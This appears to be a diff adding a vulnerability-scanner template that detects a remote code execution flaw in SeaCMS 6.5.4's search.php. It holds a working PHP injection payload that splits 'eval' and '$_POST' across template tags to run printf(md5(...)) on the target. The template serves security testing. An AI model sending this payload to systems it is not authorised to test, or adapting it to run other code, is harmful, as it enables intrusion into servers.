@@ -1,0 +1,33 @@
+id: seacms-6-5-4-search-php-rce
+
+info:
+  name: SeaCMS 6.5.4 Search.php Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    SeaCMS 6.5.4 contains a remote code execution vulnerability in the search.php file that allows attackers to execute arbitrary PHP code.
+  reference:
+    - http://0day5.com/archives/4249/
+    - https://phyb0x.github.io/2018/10/09/seacms%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%86%E6%9E%90/
+
+variables:
+  rand: "{{rand_int(2000000000, 2100000000)}}"
+
+http:
+  - raw:
+      - |
+        POST /search.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        searchtype=5&searchword={if{searchpage:year}&year=:e{searchpage:area}}&area=v{searchpage:letter}&letter=al{searchpage:lang}&yuyan=(join{searchpage:jq}&jq=($_P{searchpage:ver}&&ver=OST[9]))&9[]=prin&9[]=tf(md5({{rand}}));
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{md5(rand)}}"
+        part: body
